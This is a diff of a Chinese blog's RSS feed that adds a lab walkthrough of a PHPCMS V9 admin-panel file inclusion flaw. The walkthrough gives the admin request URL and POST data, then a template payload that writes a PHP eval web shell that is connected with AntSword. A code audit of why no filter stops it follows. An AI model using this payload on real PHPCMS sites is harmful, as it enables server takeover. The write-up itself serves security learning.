@@ -7,10 +7,10 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Dongyu</copyright>
-        <lastBuildDate>Tue, 17 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://dongyuzzz5.github.io/tags/%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 19 Mar 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://dongyuzzz5.github.io/tags/%E6%BC%8F%E6%B4%9E/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>PHP代码审计 --- 文件包含漏洞</title>
         <link>https://dongyuzzz5.github.io/p/phpchat2/</link>
-        <pubDate>Tue, 17 Mar 2026 00:00:00 +0000</pubDate>
+        <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
         
         <guid>https://dongyuzzz5.github.io/p/phpchat2/</guid>
         <description>&lt;img src="https://dongyuzzz5.github.io/p/phpchat2/111.png" alt="Featured image of post PHP代码审计 --- 文件包含漏洞" /&gt;&lt;h2 id=&#34;一-文件包含漏洞简介&#34;&gt;一. 文件包含漏洞简介
@@ -642,8 +642,624 @@ getshell成功。&lt;br&gt;
 编码正确的话，file=php://input这句应该会变颜色(如上图)。&lt;/p&gt;
 &lt;h2 id=&#34;四-实战&#34;&gt;四. 实战
 &lt;/h2&gt;&lt;h3 id=&#34;1phpcms靶场安装&#34;&gt;1.PHPCMS靶场安装
-&lt;/h3&gt;&lt;p&gt;具体安装教程可以看我的另一篇文章：&lt;a class=&#34;link&#34; href=&#34;https://dongyuzzz5.github.io/p/bachang/?t=1773765534838&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+&lt;/h3&gt;&lt;p&gt;这是一个PHPCMS V9后台文件包含漏洞 =&amp;gt; getshell的例子。&lt;br&gt;
+具体安装教程可以看我的另一篇文章：&lt;a class=&#34;link&#34; href=&#34;https://dongyuzzz5.github.io/p/bachang/?t=1773765534838&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;靶场安装教程&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2漏洞复现&#34;&gt;2.漏洞复现
+&lt;/h3&gt;&lt;p&gt;先进入phpcms靶场，然后登录后台。&lt;br&gt;
+进入后台后，记一下URL中的pc_hash的值，我这里为LpeKWX。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.4.jpg&#34;
+	width=&#34;1445&#34;
+	height=&#34;870&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.4_hu_52c5e217e71b618d.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.4_hu_d33061b9f1927de3.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;398px&#34;
+	
+&gt;&lt;br&gt;
+接着我们访问下面这个URL。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;index.php?m&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;block&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;block_admin&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pc_hash&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;B8mgrw&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;add&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;记得将pc_hash=B8mgrw替换成刚刚的值LpeKWX。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.5.jpg&#34;
+	width=&#34;1218&#34;
+	height=&#34;554&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.5_hu_78e79d2697697ce5.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.5_hu_4ae18d1923833bc5.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;219&#34;
+		data-flex-basis=&#34;527px&#34;
+	
+&gt;&lt;br&gt;
+然后打开hackbar或者bp抓包，发送一下下面这条数据。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;dosubmit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ac&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我这里使用hackbar提交。 &lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.6.jpg&#34;
+	width=&#34;1538&#34;
+	height=&#34;1055&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.6_hu_3e0e1b7f5ad00e1c.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.6_hu_95aa1aa258a2b4a9.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;145&#34;
+		data-flex-basis=&#34;349px&#34;
+	
+&gt;&lt;br&gt;
+点击上传后，页面会弹出操作成功的页面，然后返回下面页面。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.7.jpg&#34;
+	width=&#34;1792&#34;
+	height=&#34;469&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.7_hu_16e2f9da27dbf874.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.7_hu_8f1357d074de2835.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;382&#34;
+		data-flex-basis=&#34;917px&#34;
+	
+&gt;&lt;br&gt;
+可以看到这里我pc_hash的值和前面的值不一样。&lt;br&gt;
+这是因为我在前几次操作时都没有成功，然后尝试退出重新登录后台重复几次该操作，该值就刷新了。&lt;br&gt;
+若你用bp没法成功，就试一下hackbar,安装教程网上很多，测试有时候还是很方便的。&lt;br&gt;
+接着我们在出来这个页面这里，有个碎片模板的输入框。&lt;br&gt;
+我们将方框中的内容替换成下面payload。&lt;br&gt;
+(POST前有个_ ,截图有误，没_后面蚁剑连接会显示数据为空，别问我怎么知道的ToT)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;phpcms_shell.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php eval(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\$&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;_POST[1]);?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;点击预览。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.8.jpg&#34;
+	width=&#34;1836&#34;
+	height=&#34;509&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.8_hu_535cbf49b965d421.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.8_hu_d60655300c928fe5.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;360&#34;
+		data-flex-basis=&#34;865px&#34;
+	
+&gt;&lt;br&gt;
+点后页面没反应。&lt;br&gt;
+但我们打开网页目录，会发现生成了第一个php文件，且内容为我们刚写入的一句话木马。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.9.jpg&#34;
+	width=&#34;1238&#34;
+	height=&#34;866&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.9_hu_1b49dbe0db444a55.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.9_hu_a55a79c1052b36e4.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;343px&#34;
+	
+&gt;&lt;br&gt;
+然后打开蚁剑。(安装教程后面我再写篇文章，文章名应该叫网安常用工具安装教程)&lt;br&gt;
+右键添加数据。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.10.jpg&#34;
+	width=&#34;817&#34;
+	height=&#34;685&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.10_hu_16567955026d8d8b.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.10_hu_58815d9ca1737345.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;119&#34;
+		data-flex-basis=&#34;286px&#34;
+	
+&gt;&lt;br&gt;
+点击测试链接，成功会有下面弹窗。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.11.jpg&#34;
+	width=&#34;1538&#34;
+	height=&#34;963&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.11_hu_a7213062c1c51b63.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.11_hu_698343cd74df69e1.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;159&#34;
+		data-flex-basis=&#34;383px&#34;
+	
+&gt;&lt;br&gt;
+点击添加，双击添加的数据，就getshell了。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.12.jpg&#34;
+	width=&#34;1524&#34;
+	height=&#34;1029&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.12_hu_19a59c8085868d0a.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.12_hu_67147cdfe9be3e47.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;148&#34;
+		data-flex-basis=&#34;355px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;3漏洞分析&#34;&gt;3.漏洞分析
+&lt;/h3&gt;&lt;p&gt;这里我们先打开我们的代码审计工具：seay源代码审计系统。&lt;br&gt;
+根据安装教程可以看我另一篇文章：&lt;a class=&#34;link&#34; href=&#34;https://dongyuzzz5.github.io/p/phptool/?t=1773909853052&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PHP代码审计工具安装教程&lt;/a&gt;&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.13.jpg&#34;
+	width=&#34;1031&#34;
+	height=&#34;1026&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.13_hu_e70cd66761e328ac.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.13_hu_8a694a1f75f502b2.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;100&#34;
+		data-flex-basis=&#34;241px&#34;
+	
+&gt;&lt;br&gt;
+我们要查找的是文件包含漏洞。&lt;br&gt;
+所以我们可以用正则方法查找include,include_once等等函数。&lt;br&gt;
+我们可以用该工具的全局搜索功能进行查找。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.14.jpg&#34;
+	width=&#34;1886&#34;
+	height=&#34;1016&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.14_hu_19f9d5a800c8aa4f.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.14_hu_ff5bdfa9c0086a26.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;185&#34;
+		data-flex-basis=&#34;445px&#34;
+	
+&gt;&lt;br&gt;
+稍等一会后，我们往下拉，看到下面这个路径，就是存在的漏洞地点。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.15.jpg&#34;
+	width=&#34;1364&#34;
+	height=&#34;607&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.15_hu_79408f3ea2a901b4.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.15_hu_58bd7089e04798b1.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;224&#34;
+		data-flex-basis=&#34;539px&#34;
+	
+&gt;&lt;br&gt;
+这里使用的是modules(可以理解成模块总称)中的block模块里的block_admin控制器。&lt;br&gt;
+接着我们用Sublime打开该代码文件。&lt;br&gt;
+Sublime工具安装也可以看我的那篇&lt;a class=&#34;link&#34; href=&#34;https://dongyuzzz5.github.io/p/phptool/?t=1773909853052&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PHP代码审计工具安装教程&lt;/a&gt; 文章。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.16.jpg&#34;
+	width=&#34;1680&#34;
+	height=&#34;1180&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.16_hu_946ea72c89142b56.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.16_hu_ed22e0f41d896068.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;142&#34;
+		data-flex-basis=&#34;341px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;往下拉可以看到那句文件包含语句。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.17.jpg&#34;
+	width=&#34;1185&#34;
+	height=&#34;763&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.17_hu_1f40b27ff0605db5.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.17_hu_3ad675884d9106d6.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;155&#34;
+		data-flex-basis=&#34;372px&#34;
+	
+&gt;&lt;br&gt;
+在这句语句外面可以看到对$filepath这个参数的定义。&lt;br&gt;
+它是通过几个参数和$id进行拼接的。&lt;br&gt;
+我们在看到包含这个语句的if判断，在判断条件这里&lt;br&gt;
+使用了一个file_put_contents()函数，这个函数的意思是将$str参数传入到$filepath。&lt;br&gt;
+那我们是不是就可以通过这个逻辑，通过控制这个$str参数造成一个文件包含漏洞。&lt;br&gt;
+然后我们就来看它是如何定义这个$str的。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.18.jpg&#34;
+	width=&#34;1568&#34;
+	height=&#34;696&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.18_hu_faaef1507e1c6172.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.18_hu_e2fb1040ff09d63f.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;225&#34;
+		data-flex-basis=&#34;540px&#34;
+	
+&gt;&lt;br&gt;
+可以看到将$template这个参数经过两个函数方法后提交给$str。&lt;br&gt;
+而$template则是通过了一个POST提交的判断，若不是POST提交则返回空。&lt;/p&gt;
+&lt;p&gt;这里都没有什么问题那我们就来跟踪一下处理$template的两个方法。&lt;br&gt;
+首先跟踪下第一个方法。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.19.jpg&#34;
+	width=&#34;1420&#34;
+	height=&#34;549&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.19_hu_f3582676be45c87e.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.19_hu_c87ba2c2f512d067.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;258&#34;
+		data-flex-basis=&#34;620px&#34;
+	
+&gt;&lt;br&gt;
+这个函数方法的作用我们可以在注释这里清楚看到。&lt;br&gt;
+我们先看判断字符串部分。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.20.jpg&#34;
+	width=&#34;1115&#34;
+	height=&#34;370&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.20_hu_84009140344b6447.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.20_hu_1ec69c0bc6b00be8.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;301&#34;
+		data-flex-basis=&#34;723px&#34;
+	
+&gt;&lt;br&gt;
+然后是对判断为数组进行处理。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.21.jpg&#34;
+	width=&#34;1103&#34;
+	height=&#34;393&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.21_hu_e931366104322200.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.21_hu_611d4afec9c23163.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;280&#34;
+		data-flex-basis=&#34;673px&#34;
+	
+&gt;&lt;br&gt;
+从上可以看出，它其实对我们进行写入木马的恶意操作是没有进行过滤的。&lt;br&gt;
+它删不删反斜杠其实都没有影响。&lt;br&gt;
+它不删我们就正常写入，它删我们就在引号前加反斜杠就行了。&lt;/p&gt;
+&lt;p&gt;接着我们回来跟踪一下第二个函数方法。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.22.jpg&#34;
+	width=&#34;1124&#34;
+	height=&#34;380&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.22_hu_46d22e6ac660b5e5.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.22_hu_1ac4077282bb6c72.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;295&#34;
+		data-flex-basis=&#34;709px&#34;
+	
+&gt;&lt;br&gt;
+打开后是一个解析模板。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.23.jpg&#34;
+	width=&#34;1415&#34;
+	height=&#34;673&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.23_hu_cd9fe67c9b7f855c.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.23_hu_91e70b4ffd6f1f59.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;210&#34;
+		data-flex-basis=&#34;504px&#34;
+	
+&gt;&lt;br&gt;
+那什么是模板呢，像下图这个就是一个模板。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.24.jpg&#34;
+	width=&#34;1096&#34;
+	height=&#34;322&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.24_hu_b106e97a96c883ab.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.24_hu_cb1356c3ad4f9f6c.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;340&#34;
+		data-flex-basis=&#34;816px&#34;
+	
+&gt;&lt;br&gt;
+结合代码里它在识别大括号里的东西，通过一些自定义的正则表达式方法，解析php代码然后再页面显示出来。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.25.jpg&#34;
+	width=&#34;1187&#34;
+	height=&#34;585&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.25_hu_8ca953b8e17d1541.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.25_hu_9902e70bffce3d1d.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;202&#34;
+		data-flex-basis=&#34;486px&#34;
+	
+&gt;&lt;br&gt;
+可以看到这第二个方法对我们的恶意操作也是没有进行过滤的。&lt;/p&gt;
+&lt;p&gt;要知道，我们是可以直接将而已代码直接写入$filepath的，像下图这样。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.26.jpg&#34;
+	width=&#34;828&#34;
+	height=&#34;189&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.26_hu_dd438c60a25887b8.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.26_hu_1cd537336dbf3d7a.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;438&#34;
+		data-flex-basis=&#34;1051px&#34;
+	
+&gt;&lt;br&gt;
+所以在在进行恶意操作时，我们无需考虑这个参数的过滤。&lt;br&gt;
+我们我们重点再看一下$template函数的写入。&lt;br&gt;
+在定义这个参数时需要先进入一个if判断。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.27.jpg&#34;
+	width=&#34;1405&#34;
+	height=&#34;616&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.27_hu_edd9dfdaf217b2c9.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.27_hu_bc4728f50dbb2494.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;547px&#34;
+	
+&gt;&lt;br&gt;
+所以我们再来看这个data数组的由来。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.28.jpg&#34;
+	width=&#34;1333&#34;
+	height=&#34;449&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.28_hu_36ad64501b2141ae.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.28_hu_7b8b90758e3feca9.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;296&#34;
+		data-flex-basis=&#34;712px&#34;
+	
+&gt;&lt;br&gt;
+可以看到，它在数据库当中通过get_one的方式获取一个id值，将其赋值给data变量。&lt;br&gt;
+而id的值则是直接通过GET获取的。&lt;br&gt;
+我们追踪一下这个get_one函数，看它是如何在数据库提取数据的。&lt;br&gt;
+后好几个定义，我们要找到最初的那个(一般是public function)。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.29.jpg&#34;
+	width=&#34;1360&#34;
+	height=&#34;485&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.29_hu_4e61d6a65ff675c6.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.29_hu_e92dc3aacda16653.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;280&#34;
+		data-flex-basis=&#34;672px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这就是一个获取数据的函数。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.30.jpg&#34;
+	width=&#34;1504&#34;
+	height=&#34;638&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.30_hu_ad993477cf89fe0e.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.30_hu_4dc4564aeb289eb8.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;235&#34;
+		data-flex-basis=&#34;565px&#34;
+	
+&gt;&lt;br&gt;
+而传入进去的其实就一个data值，这个$table参数就是数据表，里面就有我们要利用的type值。&lt;br&gt;
+往下看，这里将获取的data中的每一个值用逗号隔开再传给$field。&lt;br&gt;
+$field参数则再传给array_walk数组，并且进行一个‘add_special_char’处理。
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.31.jpg&#34;
+	width=&#34;1116&#34;
+	height=&#34;458&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.31_hu_433860f0b86ccf01.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.31_hu_7c04d18140ec4910.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;243&#34;
+		data-flex-basis=&#34;584px&#34;
+	
+&gt;&lt;br&gt;
+往下查找这个处理方法，进行跟踪。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.32.jpg&#34;
+	width=&#34;1351&#34;
+	height=&#34;631&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.32_hu_60a543f775a08813.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.32_hu_bfb14b8805755fa1.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;214&#34;
+		data-flex-basis=&#34;513px&#34;
+	
+&gt;&lt;br&gt;
+但发现它只是将传入的字段进行加引号的操作，并没有影响我们的恶意操作。&lt;br&gt;
+&lt;img src=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.33.jpg&#34;
+	width=&#34;1137&#34;
+	height=&#34;477&#34;
+	srcset=&#34;https://dongyuzzz5.github.io/p/phpchat2/4.33_hu_996be3aea0436099.jpg 480w, https://dongyuzzz5.github.io/p/phpchat2/4.33_hu_e48f1377a6592611.jpg 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
